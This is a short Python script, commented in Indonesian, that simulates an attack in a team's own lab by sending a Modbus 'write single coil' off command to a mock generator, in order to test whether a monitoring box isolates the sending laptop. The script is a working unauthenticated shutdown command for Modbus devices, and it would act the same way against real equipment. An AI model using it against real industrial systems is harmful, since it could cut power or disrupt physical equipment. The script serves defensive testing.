"""Simulasi serangan untuk lab sendiri: mengirim perintah "matikan" ke genset tiruan.

HANYA untuk genset tiruan (lab/genset_tiruan.py) di lab milik tim sendiri.

Yang dikirim: Modbus fungsi 5 (tulis satu coil), alamat 0, nilai 0x0000 (mati).
Kalau kotak Pos Jaga sudah mengisolasi laptop ini lewat MikroTik, kiriman
berikutnya akan gagal karena paketnya dibuang router.

Contoh:
  python lab/serangan_genset.py --target 10.20.0.10 --port 502 --ulang 5
  python lab/serangan_genset.py --target 127.0.0.1 --port 5020     # coba di satu laptop
"""

import argparse
import socket
import struct
import time


def turn_off(target, port, transaction_id, timeout, source=None):
    request = struct.pack(">HHHBBHH", transaction_id, 0, 6, 1, 5, 0, 0x0000)
    with socket.create_connection((target, port), timeout=timeout, source_address=source) as sock:
        sock.sendall(request)
        reply = sock.recv(256)
    return reply[:12] == request[:12]


def main():
    parser = argparse.ArgumentParser(description="Simulasi perintah matikan ke genset tiruan (lab sendiri)")
    parser.add_argument("--target", required=True, help="alamat genset tiruan")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--ulang", type=int, default=1, help="berapa kali perintah dikirim")
    parser.add_argument("--jeda", type=float, default=3.0, help="jeda antar kiriman (detik)")
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument("--dari", help="alamat asal (kalau VM punya lebih dari satu alamat)")
    args = parser.parse_args()

    source = (args.dari, 0) if args.dari else None
    for n in range(1, args.ulang + 1):
        stamp = time.strftime("%H:%M:%S")
        try:
            ok = turn_off(args.target, args.port, n, args.timeout, source)
            print(f"{stamp}  kiriman {n}: " + ("diterima genset (genset dimatikan)" if ok else "balasan tidak sesuai"))
        except OSError as exc:
            print(f"{stamp}  kiriman {n}: GAGAL menghubungi genset ({exc}). Kemungkinan laptop ini sudah diisolasi.")
        if n < args.ulang:
            time.sleep(args.jeda)


if __name__ == "__main__":
    main()
